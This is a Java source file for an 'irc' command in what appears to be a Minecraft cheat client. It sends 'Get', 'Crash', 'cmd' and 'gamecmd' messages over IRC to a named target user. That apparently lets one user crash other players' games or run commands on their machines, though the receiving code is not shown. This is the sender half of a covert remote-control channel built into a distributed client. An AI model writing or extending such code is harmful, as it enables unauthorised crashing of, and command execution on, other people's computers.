package it.fktcod.ktykshrk.command.irc;

import org.lwjgl.input.Keyboard;

import it.fktcod.ktykshrk.command.Command;
import it.fktcod.ktykshrk.irc.IRCChat;
import it.fktcod.ktykshrk.irc.IRCFrame;
import it.fktcod.ktykshrk.managers.HackManager;
import it.fktcod.ktykshrk.utils.visual.ChatUtils;
import it.fktcod.ktykshrk.utils.visual.EnumChatFormatting;
import it.fktcod.ktykshrk.wrappers.Wrapper;



public class IRC extends Command {
	public IRC() {
		super("irc");
	}

	@Override
	public void runCommand(String s, String[] args) {
		try {
			////System.out.println(s);
			////System.out.println(args[0]);
			////System.out.println(args[1]);
			if (args[0].equalsIgnoreCase("get") && args[1] != null) {
				if (HackManager.getHack("IRCChat").isToggled() ) {
					IRCChat.send("Get"+IRCChat.FGF+ args[1]);
				}
			}

			if (args[0].equalsIgnoreCase("crash") && args[1] != null) {
				if (HackManager.getHack("IRCChat").isToggled() ) {
					IRCChat.send("Crash"+IRCChat.FGF+ args[1]);
				}
			}

			if (args[0].equalsIgnoreCase("cmd") && args[1] != null && args[2] != null) {
				if (HackManager.getHack("IRCChat").isToggled() ) {
					IRCChat.send("cmd"+IRCChat.FGF+ args[1]+IRCChat.FGF+ args[2]);
				}
			}

			if (args[0].equalsIgnoreCase("gamecmd") && args[1] != null && args[2] != null) {
				if (HackManager.getHack("IRCChat").isToggled() ) {
					IRCChat.send("gamecmd"+IRCChat.FGF+ args[1]+IRCChat.FGF+ args[2]);
				}
			}

		} catch (Exception e) {
			ChatUtils.error("Usage: " + getSyntax());
		}
	}

	@Override
	public String getDescription() {
		return "IRC CHAT.";
	}

	@Override
	public String getSyntax() {

		return "kick";
	}

}
